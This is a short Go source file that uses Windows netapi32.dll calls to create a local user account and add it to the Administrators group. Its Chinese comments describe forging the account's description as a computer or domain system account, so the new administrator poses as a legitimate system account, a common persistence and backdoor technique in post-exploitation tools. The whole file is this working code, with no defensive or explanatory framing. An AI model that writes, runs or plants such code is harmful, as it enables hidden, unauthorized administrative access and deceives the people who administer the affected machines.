package server

import (
	"errors"
	"os"
	"syscall"
	"unsafe"
)

type USER_INFO_1 struct {
	Usri1_name         *uint16
	Usri1_password     *uint16
	Usri1_password_age uint32
	Usri1_priv         uint32
	Usri1_home_dir     *uint16
	Usri1_comment      *uint16
	Usri1_flags        uint32
	Usri1_script_path  *uint16
}

type localGroupMembersInfo struct {
	domainAndName *uint16
}

var (
	netApi32                    = syscall.NewLazyDLL("netapi32.dll")          //加载dll
	procNetUserAdd              = netApi32.NewProc("NetUserAdd")              //获取dll的创建用户方法
	procNetLocalGroupAddMembers = netApi32.NewProc("NetLocalGroupAddMembers") //获取dll的添加用户组方法
)

type UserInfo struct {
	UserName string
	UserPass string
}

//NetUserAdd 添加系统用户
func NetUserAdd(
	addUser UserInfo,
) (err error) {
	uInfo := USER_INFO_1{
		Usri1_priv:  1,
		Usri1_flags: 1,
	}
	//账户
	uInfo.Usri1_name, _ = syscall.UTF16PtrFromString(addUser.UserName)
	//密码
	uInfo.Usri1_password, _ = syscall.UTF16PtrFromString(addUser.UserPass)
	//伪造用户描述
	uInfo.Usri1_comment, _ = syscall.UTF16PtrFromString("管理计算机(域)的系统帐户")

	r1, _, _ := procNetUserAdd.Call(
		uintptr(0),                      //servername.如果为null则是添加到本机。在go中调用的话，填0忽略
		uintptr(uint32(1)),              //level
		uintptr(unsafe.Pointer(&uInfo)), //userInfo
		uintptr(0),                      //err
	)
	if r1 != 0 {
		return syscall.Errno(r1)
	}
	//默认将新创建的用户加入管理员组
	_, err = addGroupMembership(addUser.UserName, "Administrators")
	return err
}

//addGroupMembership 添加用户组
func addGroupMembership(userName, groupName string) (bool, error) {
	hn, _ := os.Hostname()
	uPointer, err := syscall.UTF16PtrFromString(hn + `\` + userName)
	if err != nil {
		return false, errors.New("unable to encode user name to UTF16")
	}
	gPointer, err := syscall.UTF16PtrFromString(groupName)
	if err != nil {
		return false, errors.New("unable to encode group name to UTF16")
	}
	var uArray = make([]localGroupMembersInfo, 1)
	uArray[0] = localGroupMembersInfo{
		domainAndName: uPointer,
	}
	ret, _, _ := procNetLocalGroupAddMembers.Call(
		uintptr(0),                          // servername
		uintptr(unsafe.Pointer(gPointer)),   // group name
		uintptr(uint32(3)),                  // level
		uintptr(unsafe.Pointer(&uArray[0])), // user array.
		uintptr(uint32(len(uArray))),
	)
	if ret != 0 {
		return false, syscall.Errno(ret)
	}
	return true, nil
}
